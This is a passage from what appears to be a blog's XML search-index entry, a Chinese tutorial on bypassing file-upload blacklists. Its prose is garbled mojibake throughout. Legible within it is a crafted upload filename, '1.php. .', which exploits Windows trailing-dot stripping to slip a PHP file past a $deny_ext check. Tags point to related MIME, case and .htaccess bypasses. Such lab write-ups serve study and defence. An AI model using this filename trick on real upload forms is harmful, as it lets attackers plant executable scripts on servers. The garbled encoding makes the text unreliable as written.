<p> è¿™ä¸€å¥ä»£ç æ˜¯ç”¨æ¥æ£€æµ‹æœ«å°¾æ˜¯å¦æ˜¯<code>.</code>ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚<br>æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º<code>1.php. .</code> ï¼ˆæ³¨æ„ä¸¤ç‚¹ä¹‹é—´æœ‰ç©ºæ ¼ï¼‰ å‰é¢å»æ‰.ç„¶åæ£€éªŒ.ä¸å­˜åœ¨ï¼Œå†å»ç©ºæ ¼ï¼Œç•™ä¸‹php.ï¼Œç„¶åphp.ä¸å±äº$deny_extæ•°ç»„ä¸­å­˜åœ¨çš„ï¼Œå½“ç„¶å°±ç›´æ¥æäº¤äº†ã€‚å› ä¸ºwindowsè‡ªåŠ¨å»ç‚¹ï¼Œäºæ˜¯phpåç¼€å°±å‡ºæ¥äº† </p>
<img src="/2020/09/16/uploads/10.png" srcset="/img/loading.gif" style="zoom:50%;">

<p><img src="/2020/09/16/uploads/10-1.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>æ–‡ä»¶ä¸Šä¼ </category>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>MIME</tag>
        <tag>å¤§å°å†™ç»•è¿‡</tag>
        <tag>.htaccess</tag>
        <tag>windowsæ–‡ä»¶ç‰¹æ€§</tag>
      </tags>
  </entry>
</search>
